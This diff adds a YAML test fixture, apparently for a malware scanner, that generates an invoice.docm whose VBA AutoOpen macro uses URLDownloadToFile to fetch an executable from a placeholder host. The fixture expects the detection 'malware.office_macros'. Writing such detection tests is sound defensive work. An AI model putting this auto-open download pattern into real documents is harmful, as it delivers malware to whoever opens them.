@@ -1,0 +1,7 @@
+generator: docx
+args:
+  name: invoice.docm
+  vba: "Sub AutoOpen()\r\n    URLDownloadToFile 0, \"https://example.invalid/x\",\
+    \ \"C:\\missing\\filevet.exe\", 0, 0\r\nEnd Sub\r\n"
+must_find:
+- malware.office_macros
